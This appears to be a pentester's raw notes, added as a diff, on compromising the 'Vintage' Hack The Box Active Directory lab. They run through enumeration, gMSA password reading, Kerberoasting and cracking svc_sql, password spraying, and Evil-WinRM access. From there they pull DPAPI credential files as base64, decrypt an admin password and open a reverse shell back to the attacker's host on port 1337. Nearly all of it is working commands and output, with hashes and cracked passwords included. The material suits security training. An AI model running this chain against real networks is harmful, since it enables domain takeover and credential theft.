@@ -1,0 +1,353 @@
+
+
+
+As is common in real life Windows pentests, you will start the Vintage box with credentials for the following account: 
+P.Rosa / Rosaisbest123
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# smbclient -L //10.10.11.45/ -U P.Rosa
+session setup failed: NT_STATUS_NOT_SUPPORTED
+                                               
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-getTGT vintage.htb/P.Rosa:'Rosaisbest123' -dc-ip 10.10.11.45 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in P.Rosa.ccache
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# bloodhound-python -u 'p.rosa' -p 'Rosaisbest123' -k -d 'vintage.htb' --zip -c All -dc dc01.vintage.htb -ns 10.10.11.45 --dns-tcp
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: vintage.htb
+INFO: Using TGT from cache
+INFO: Found TGT with correct principal in ccache file.
+INFO: Connecting to LDAP server: dc01.vintage.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 2 computers
+INFO: Connecting to LDAP server: dc01.vintage.htb
+INFO: Found 16 users
+INFO: Found 58 groups
+INFO: Found 2 gpos
+INFO: Found 2 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: FS01.vintage.htb
+INFO: Querying computer: dc01.vintage.htb
+WARNING: Could not resolve: FS01.vintage.htb: The resolution lifetime expired after 3.119 seconds: Server Do53:10.10.11.45@53 answered The DNS operation timed out.
+INFO: Done in 00M 07S
+INFO: Compressing output into 20251015083612_bloodhound.zip
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+adjust bloodhound CE cypher to view only our current domain
+WHERE t.objectid ENDS WITH '-512' AND s<>t AND t.domain = 'VINTAGE.HTB' AND s.domain = 'VINTAGE.HTB'
+
+"Doing some research about pre-windows 2000, we have a blog by TrustedSec, and this means that
+when the pre-create computer accounts with the "Assign this computer account as a pre-Windows
+2000 computer" checkmark, the password for the computer account becomes the same as the
+computer account in lowercase. The group isn't the configuration; instead, it is a hint about the
+computer object."
+https://trustedsec.com/blog/diving-into-pre-created-computer-accounts
+
+computer account name is:
+FS01.VINTAGE.HTB
+
+┌──(root㉿kali)-[/home/kali]
+└─# netexec ldap 10.10.11.45 -d vintage.htb -u 'fs01$' -p 'fs01' -k
+LDAP        10.10.11.45     389    DC01             [*] None (name:DC01) (domain:vintage.htb)
+LDAP        10.10.11.45     389    DC01             [+] vintage.htb\fs01$:fs01 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-getTGT vintage.htb/FS01:'fs01' -dc-ip 10.10.11.45               
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in FS01.ccache
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# export KRB5CCNAME=$(pwd)/FS01.ccache                                                        
+                                                                                                                     
+FS01 is a member of DOMAIN COMPUTERS which can ReadGMSAPassword of GMSA01$
+
+Distinguished Name:
+CN=GMSA01,CN=MANAGED SERVICE ACCOUNTS,DC=VINTAGE,DC=HTB
+
+┌──(root㉿kali)-[/home/kali]
+└─# bloodyAD -d vintage.htb -k --host "dc01.vintage.htb" get object "CN=GMSA01,CN=MANAGED SERVICE ACCOUNTS,DC=VINTAGE,DC=HTB" --attr msDS-ManagedPassword
+
+distinguishedName: CN=GMSA01,CN=MANAGED SERVICE ACCOUNTS,DC=VINTAGE,DC=HTB
+msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:3cc51fff9dfca7dc208252d1c570bb38
+msDS-ManagedPassword.B64ENCODED: 2AWPGtq5oeMIDA4gk+mihiGnbcc34aLR2KvVBj6sHj+YifC0cJAdAmhaomIRfAWc9giDMOUYF9n+FnJkvn3rci7FtIT5Ug9wjMwL9mKl78WjaWSTpGkBFja8TtL2Gs9skg/Ma0gfckV/w5FJx1BODB9s3ty1nS/LY+/omWpXfJ8w4QF1JqqL0nLBBqMQJ4wrZmhxbkQ91O6Vk6H5DdptMaUOVSh0Y3kuYB4zyp6V4vVIdno6UpbZsJ3Sdx/ep2j8F3xlj+zK/XHcP0eUJeahloCHx4PoltgKBvy0UDP3wXJmf2MvW/dhw9ErBlHZhq7cpXCIjkAoxTB8Cs/j6csEgg==
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+"The GMSA01$ service account is configured to have GenericWrite and AddSelf ACLs over the
+ServiceManager group. This means the GMSA01$ account can add itself to the ServiceManager
+group."
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-getTGT vintage.htb/GMSA01 -hashes aad3b435b51404eeaad3b435b51404ee:3cc51fff9dfca7dc208252d1c570bb38 -dc-ip 10.10.11.45
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in GMSA01.ccache
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# bloodyAD -d vintage.htb -k --host "dc01.vintage.htb" add groupMember ServiceManagers GMSA01$
+[+] GMSA01$ added to ServiceManagers
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+"Once the user is added to the ServiceManager group, the attacker has to request another
+Kerberos ticket. Once the ticket is requested, the group will have GenericWrite for over three
+user objects. One of them is svc_sql , which is a disabled account"
+
+"As we have GenericWrite, we can modify the object's LDAP attribute; this allows us to modify the
+user account to reenable it and add an SPN to make it Kerberoastable"
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-getTGT vintage.htb/GMSA01 -hashes aad3b435b51404eeaad3b435b51404ee:3cc51fff9dfca7dc208252d1c570bb38 -dc-ip 10.10.11.45
+export KRB5CCNAME=$(pwd)/GMSA01.ccache
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in GMSA01.ccache
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# bloodyAD -d vintage.htb -k --host "dc01.vintage.htb" remove uac svc_sql -f ACCOUNTDISABLE
+[-] ['ACCOUNTDISABLE'] property flags removed from svc_sql's userAccountControl
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# bloodyAD -d vintage.htb -k --host "dc01.vintage.htb" set object svc_sql servicePrincipalName -v 'http/anything'
+[+] svc_sql's servicePrincipalName has been updated
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# export KRB5CCNAME=$(pwd)/GMSA01.ccache                                                                         
+impacket-GetUserSPNs -k -no-pass -dc-ip 10.10.11.45 -dc-host dc01.vintage.htb vintage.htb/ -request
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName  Name     MemberOf                                               PasswordLastSet             LastLogon  Delegation 
+--------------------  -------  -----------------------------------------------------  --------------------------  ---------  ----------
+http/anything         svc_sql  CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb  2025-10-15 09:32:11.049536  <never>               
+
+
+
+$krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb/svc_sql*$0c95580bf02b2b2cce252c1971153a61$7c56bcee76d36b2601602eb271b66b611ad07cf9fea15f36cd0d3f17c02eb595e9a40f1d2e567193fb9a431d104f4d92e0623e6d04aac0197a5f272a5a26decf00b7f82f54442253bc4cc333263bd15587d31e6b7ca493d5ee4be45240d86f28a33942aeb158a550d803d197c511685e1cfdada686e7e11f6a96c2401dc016d1ebdba2eed6a607784479c2271ec904544ff39899b7b84315579fc95c1adf7015159b5a4cd3710d3f230d6f2b4b3e363c248bd7d960d4917369e8da9a6a5d21a009e1e52eab2a1b17436441eb6d9cfed2f946afbc89bfc245e34d65b48ca03721f795b33902f28af7b59cdeb2eac37e2be288f5ae7cbb3ff27d13294d2fa4208717faa94a28f64875eb768b43d78c5663064a74e812733b6e8e67800bc80418ae2be32c4bfa762ac07696f9dadf768f066cea7adc84dbf46f4909980a195c0da1362274c3db961c6707ba00af096ecc00bbde7e2287db0bf4c312ce11ce5386464f774fbe9cbc397179b3db91bc571096a0127bc91b46bde453d21f2330949acf2e7df0ca13831bd87753f911b0ebe33729d9764499589ddac0f36e04bfb095ee08ac16488444830677d6b7379f60e2b02ca498210692e6c1f1913edc7fb07589d1ab843705957a0a85336acad761d58ea7c66406955a2143f4920929931cb73724dfde8c3a36c146a53ce74378e2d75ce563d5c3afbbaef93975b99f4b81e4a35da1a6c6ba791eb9b85f831cd0600014e77af0d02f085c96faa09a9a7e3c14da81b2ddbd8b21d6a6998da183c3a388bbf3529c0082c1854304a9c99f42b232e7de8c827b22a7e209b1aa11b1063b3c8f3d48e7a532cd4661b4207c8d9df981622b84e8b45cf159b37f98fa4c0256d68da106068d89f50974949f9dee442948c3dfef224723e12fb4bd214865dd21b63c97011cb1d6c6c8803961e897f752f52379dcb52bd7312c81027e41c913397597134b1e4563b2c01542349f58d07f4228dca6c4dbb44841bdd015d210763af934c0a2f56dd6237102c800c31a55d8f2259b79eb7ddaa27e89443be6513a59921219b98ed4d7b872f536d009949125def36fda2445132af38d5946bd78d5dec1b923efef94687800428268ab7d4046d389611fd9b6cf2f7712af4045c52ea2fd0a3815be2338fe6e960dbe0263fd8ce792f691f217d33d6e428f395e20115cfd4833de3a90f1eb00d70ba79112b9fea2c137f97d2c7d5069e14fa2c14d1d381a1e7339f1f34e1794e86e9d870e615b290b5ff2913d4edb85d7f1e4649f7e05fcc56fd9eba87c589f10b4880c0baf30fbb3081c67f0570d6a4610665f9a069b9593949967d571f6ac9d10c9506b4b079622288ab0510371e0bdb799cd8c4547b5c176ad14e67da0468bbb0a72b2dbc02c5942591812ed8926704660d4c74d77a4e780586fdcfc34aecd9f69bcc8ff133d56ee95
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Zer0the0ne       (?)     
+1g 0:00:00:00 DONE (2025-10-15 09:37) 1.851g/s 1922Kp/s 1922Kc/s 1922KC/s abc$$$123..Zer0the0ne
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+
+Anyone else use this password? 
+
+┌──(root㉿kali)-[/home/kali]
+└─# netexec ldap 10.10.11.45 -d vintage.htb -u 'GMSA01$' -H 'aad3b435b51404eeaad3b435b51404ee:3cc51fff9dfca7dc208252d1c570bb38' -k --users
+LDAP        10.10.11.45     389    DC01             [*] None (name:DC01) (domain:vintage.htb)
+LDAP        10.10.11.45     389    DC01             [+] vintage.htb\GMSA01$:3cc51fff9dfca7dc208252d1c570bb38 
+LDAP        10.10.11.45     389    DC01             [*] Enumerated 14 domain users: vintage.htb
+LDAP        10.10.11.45     389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-
+LDAP        10.10.11.45     389    DC01             Administrator                 2024-06-08 07:34:54 0        Built-in account for administering the computer/domain
+LDAP        10.10.11.45     389    DC01             Guest                         2024-11-13 09:16:53 1        Built-in account for guest access to the computer/domain
+LDAP        10.10.11.45     389    DC01             krbtgt                        2024-06-05 06:27:35 0        Key Distribution Center Service Account
+LDAP        10.10.11.45     389    DC01             M.Rossi                       2024-06-05 09:31:08 1              
+LDAP        10.10.11.45     389    DC01             R.Verdi                       2024-06-05 09:31:08 1              
+LDAP        10.10.11.45     389    DC01             L.Bianchi                     2024-06-05 09:31:08 1              
+LDAP        10.10.11.45     389    DC01             G.Viola                       2024-06-05 09:31:08 1              
+LDAP        10.10.11.45     389    DC01             C.Neri                        2024-06-05 17:08:13 0              
+LDAP        10.10.11.45     389    DC01             P.Rosa                        2024-11-06 07:27:16 0              
+LDAP        10.10.11.45     389    DC01             svc_sql                       2025-10-15 09:32:11 1              
+LDAP        10.10.11.45     389    DC01             svc_ldap                      2024-06-06 09:45:27 1              
+LDAP        10.10.11.45     389    DC01             svc_ark                       2024-06-06 09:45:27 1              
+LDAP        10.10.11.45     389    DC01             C.Neri_adm                    2024-06-07 06:54:14 0              
+LDAP        10.10.11.45     389    DC01             L.Bianchi_adm                 2024-11-26 06:40:30 0              
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# netexec ldap 10.10.11.45 -d vintage.htb -u users -p 'Zer0the0ne' -k 
+LDAP        10.10.11.45     389    DC01             [*] None (name:DC01) (domain:vintage.htb)
+LDAP        10.10.11.45     389    DC01             [-] vintage.htb\Administrator:Zer0the0ne KDC_ERR_PREAUTH_FAILED
+LDAP        10.10.11.45     389    DC01             [-] vintage.htb\Guest:Zer0the0ne KDC_ERR_CLIENT_REVOKED
+LDAP        10.10.11.45     389    DC01             [-] vintage.htb\krbtgt:Zer0the0ne KDC_ERR_CLIENT_REVOKED
+LDAP        10.10.11.45     389    DC01             [-] vintage.htb\M.Rossi:Zer0the0ne KDC_ERR_PREAUTH_FAILED
+LDAP        10.10.11.45     389    DC01             [-] vintage.htb\R.Verdi:Zer0the0ne KDC_ERR_PREAUTH_FAILED
+LDAP        10.10.11.45     389    DC01             [-] vintage.htb\L.Bianchi:Zer0the0ne KDC_ERR_PREAUTH_FAILED
+LDAP        10.10.11.45     389    DC01             [-] vintage.htb\G.Viola:Zer0the0ne KDC_ERR_PREAUTH_FAILED
+LDAP        10.10.11.45     389    DC01             [+] vintage.htb\C.Neri:Zer0the0ne 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-getTGT vintage.htb/c.neri:'Zer0the0ne' -dc-ip 10.10.11.45
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in c.neri.ccache
+                                                                                                                     
+──(root㉿kali)-[/home/kali]
+└─# export KRB5CCNAME=c.neri.ccache     
+
+to winrm you must have /etc/krb5.conf configured with:
+
+[libdefaults]
+    default_realm = VINTAGE.HTB
+
+[realms]
+    VINTAGE.HTB = {
+        kdc = dc01.vintage.htb
+    }
+
+
+You can set a custom krb5.conf for your terminal session by exporting the KRB5_CONFIG environment variable.
+
+┌──(root㉿kali)-[/home/kali]
+└─# export KRB5_CONFIG=$(pwd)/krb5.conf
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# evil-winrm -i dc01.vintage.htb -r vintage.htb
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\C.Neri\Documents> 
+
+This user can AddSelf to DELEGATEDADMINS which is AllowedToAct DC01
+This can be double checked like so:
+
+*Evil-WinRM* PS C:\Users\C.Neri\Desktop> Get-AdComputer DC01$ -property PrincipalsAllowedToDelegateToAccount
+
+
+DistinguishedName                    : CN=DC01,OU=Domain Controllers,DC=vintage,DC=htb
+DNSHostName                          : dc01.vintage.htb
+Enabled                              : True
+Name                                 : DC01
+ObjectClass                          : computer
+ObjectGUID                           : c90b840f-7704-46ee-a3fb-aff23c8183c7
+PrincipalsAllowedToDelegateToAccount : {CN=DelegatedAdmins,OU=Pre-Migration,DC=vintage,DC=htb}
+SamAccountName                       : DC01$
+SID                                  : S-1-5-21-4024337825-2033394866-2055507597-1002
+UserPrincipalName                    :
+
+
+"We can enumerate stored credentials in the credentials manager. To enumerate them, we need an
+Interactive session with a valid profile. The WinRM session is not an interactive session but rather a
+network logon; one can find a better explanation on Bitvise blog. The RunasCs tool has mentioned
+forcing the profile to allow the spawned process to have all required environment variables and
+user profiles."
+
+
+*Evil-WinRM* PS C:\Users\C.Neri\Documents> . ./obfuscated_chimera.ps1
+*Evil-WinRM* PS C:\Users\C.Neri\Documents> 
+
+No matter what, at this stage, cannot avoid AV without breaking the ps script.
+In this case, we had BadImageFormatException.
+
+
+*Evil-WinRM* PS C:\Users\C.Neri\Documents> [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\users\c.neri\appdata\roaming\microsoft\credentials\C4BB96844A5C9DD45D5B6A9859252BA6'))
+AQAAAKIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAo0HPmVKl90yo16yi1vczmwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAAANmAADAAAAAEAAAANlsnh9uZhRwM1xc/8CNBwwAAAAABIAAAKAAAAAQAAAAK+zRTF7v+bPA1UScG2CL4uAAAABoyaUl8s/1J1TabkeZkP1VvjzlbcQ61ojdLQpks7Q0/irEKMmlFOJ/Za2o8akFz3kS28HEeNGkg/3kGNOvhVbnZ2NJQHTJ12SgjFuAuPhdS9Ob2CvqW9xu7pDGXPt5AHKqlqRy+fajjcEYkGP0ki6sLBF/rpFnQvRQ9hCg8iVqyq3BpSdwOZ1h0Zxh8mbvDPv+XHw9+o6DabZifdfj+GuMRi+GDNLvv8orYUqHZ6hHO3vB4kDu5T4G8QsIAtULBs3V2ww1G7xdGI57BGKi4LEk6kuaEWopsCflsc5FK4a4xBQAAABSjIrXKMIH3qbzDSrnPMUzCyhkAA==
+*Evil-WinRM* PS C:\Users\C.Neri\Documents> [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847'))
+AgAAAAAAAAAAAAAANABkAGIAZgAwADQAZAA4AC0ANQAyADkAYgAtADQAYgA0AGMALQBiADQAYQBlAC0AOABlADgANwA1AGUANABmAGUAOAA0ADcAAAAAAAAAAAAAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAA2or8mZsV0QcGzC0XUJ9K8FBGAAAJgAAAA2YAAJhSpSk/CQYorLpjFuO6lxoHg+a9CGghh0pqkMYfO5Irop3dQGYbS2b3KJo0qLO586XfAvV/0dK/fM8a4erXENVlgtsrHRG48O/VO0Egw0qMZld65hY3jxMWTkzfGqfjNK5ytEtwPHGkAgAAAFiAHjGrO47Qhcn7oxZZBrBQRgAACYAAAANmAABRlZY9IPg0gA9TOU3DaFwm1ylSDyf2HHVE2mTqFzwbK7ZHp2XH8Mx2rvk6EpPUtdIv4kkQU6GsO43Xyg+qcks13CkP8uIIo0ECAAAAAAEAAFgAAACn2p9w/uXURbRTVVUG8NTwGUQAxdTpQrS3sEc8gVH9tmXllgaPOCz8cyowsRu8fkbCLFyIcsLVGKHQRv3PUJ1qmSeC604xcQlXI43XddWfFZ3tFF1yLQOSNwfbKDdGQiF3yTlYb6KoMvhQXzs1O1LLP2cUEFOGw8+Pg8uMN4KDBURRWfqmRksyn38bg3OKFSQ1K0CpdNzKfPvS6TnGuvHvnglzZdT5qwQ+nOdXFuJccenatjtlVgQNdp6yZOmpQjrkTtZOxz9b0JRsoOQS0NWu7WThQU4s8yeZkHaJRSJ5lohgdYpZiLJ4x1lG5jLz7/IX5pP6UK1cq5KwLjvaMdGsK9GDj3ofoB/OldTS7StCAXHfzvgjmTscAdxSARKV8ekuDWjsXgz7iZkV04lUG5Jo2FD9xrFdY1DqTSbr7oLdHAwzFBQX5RGnDhKFJXA0KJ29sz1zHGVn4/J4k0e/Hkop6YwRfEighbU=
+
+
+*Evil-WinRM* PS C:\Users\C.Neri\Documents> [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b'))
+AgAAAAAAAAAAAAAAOQA5AGMAZgA0ADEAYQAzAC0AYQA1ADUAMgAtADQAYwBmADcALQBhADgAZAA3AC0AYQBjAGEAMgBkADYAZgA3ADMAMwA5AGIAAAAAAAAAAAAAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAA6o788ZIMNhaSpbkSX0mC01BGAAAJgAAAA2YAABAM9ZX6Z/40RYL/aC+dw/D5oa7WMYBN56zwgXYX4QrAIb4DtJoM27zWgMxygJ36SpSHHHQGJMgTs6nZN5U/1q7DBIpQlsWk15jpmUFS2czCScuP9C+dGdYT+p6AWb3L7PZUPqNDHqZRAgAAALFxHXdcOeYbfN6CsYeVaYZQRgAACYAAAANmAABiEtEJeAVpg4QA0lnUzAsf6koPtccl1os9yZrj1gTAc/oSmhBNPEE3/VVVPZw9g3NP26Wj3vO36IOmtsXWYABkukmijrSaAZUCAAAAAAEAAFgAAACn2p9w/uXURbRTVVUG8NTwr2BFf0a0DhdM8JymBww6mzQt8tVsTbDmCZ/uZu3bzOAOUXODaGaJOOKqRm2W8rHPOZ27YjtD1pd0MFJDocNJwdhN5pwTdz2v2JsrVVVE363zZjXHeXefhuL5AMwMQr6gpTsCGcxrd1ziTN9Q1lH9QtnYE7OZlbrZPhiWO2vvdX+UQcKlgpxcSGLaczL53/UJXrvt9hueRn+YXxnK+fiyZ0gmjMlP+yuxOiKSvHM/UT6NmuYewnApQrOBO3A5F1XKHguHKT+VS187uBu/TO1ZT4/CrsKws1aG7EkIXhRKzEgukAwn5nZlU6YaADdeQRDzCR1D0ycJKFyZd4QE1Nt6Kbgr+ukbiurwBJd/D1a3+WWCw+S2OJVHB9qqlcW11heJd+v9eGe1Wf6/PYCvyyWMsvusF8XUswgKQbkH821vscyNmJWDwMply/ZvellKuGQ1/s5gVqUkALQ=
+*Evil-WinRM* PS C:\Users\C.Neri\Documents> 
+
+
+
+┌──(root㉿kali)-[/home/kali/Chimera]
+└─# impacket-dpapi masterkey -file mast1 -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[MASTERKEYFILE]
+Version     :        2 (2)
+Guid        : 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
+Flags       :        0 (0)
+Policy      :        0 (0)
+MasterKeyLen: 00000088 (136)
+BackupKeyLen: 00000068 (104)
+CredHistLen : 00000000 (0)
+DomainKeyLen: 00000174 (372)
+
+Decrypted key with User Key (MD4 protected)
+Decrypted key: 0x55d51b40d9aa74e8cdc44a6d24a25c96451449229739a1c9dd2bb50048b60a652b5330ff2635a511210209b28f81c3efe16b5aee3d84b5a1be3477a62e25989f
+                                                                                                                    
+┌──(root㉿kali)-[/home/kali/Chimera]
+└─# impacket-dpapi masterkey -file mast2 -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[MASTERKEYFILE]
+Version     :        2 (2)
+Guid        : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
+Flags       :        0 (0)
+Policy      :        0 (0)
+MasterKeyLen: 00000088 (136)
+BackupKeyLen: 00000068 (104)
+CredHistLen : 00000000 (0)
+DomainKeyLen: 00000174 (372)
+
+Decrypted key with User Key (MD4 protected)
+Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
+                                                                                                                    
+┌──(root㉿kali)-[/home/kali/Chimera]
+└─# impacket-dpapi credential -file credfile -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[CREDENTIAL]
+LastWritten : 2024-06-07 15:08:23+00:00
+Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
+Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
+Type        : 0x00000001 (CRED_TYPE_GENERIC)
+Target      : LegacyGeneric:target=admin_acc
+Description : 
+Unknown     : 
+Username    : vintage\c.neri_adm
+Unknown     : Uncr4ck4bl3P4ssW0rd0312
+
+                                                                                                                    
+┌──(root㉿kali)-[/home/kali/Chimera]
+└─# 
+
+
+the isue was not AV, but attempting to run a 32 bit dll called from the .ps1 script.
+
+┌──(root㉿kali)-[/home/kali/Downloads]
+└─# mcs -platform:x64 -sdk:2 -out:RunasCs.dll RunasCs.cs                                                         
+
+┌──(root㉿kali)-[/home/kali/Downloads]
+└─# base64 -w0 RunasCs.dll > RunasCs_x64.b64
+
+then we insert the new base64 payload into the ps1 script and proceed.
+
+Evil-WinRM* PS C:\Users\C.Neri\Documents> . ./RunasCs64.ps1
+*Evil-WinRM* PS C:\Users\C.Neri\Documents> Invoke-RunasCs -Username C.Neri -password Zer0the0ne -Domain vintage.htb -Command powershell.exe -Remote 10.10.14.12:1337 -ForceProfile
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-f0319b$\Default
+[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 3900 created in background.
+*Evil-WinRM* PS C:\Users\C.Neri\Documents> 
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lnvp 1337     
+listening on [any] 1337 ...
+connect to [10.10.14.12] from (UNKNOWN) [10.10.11.45] 49902
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\system32>    
+
+
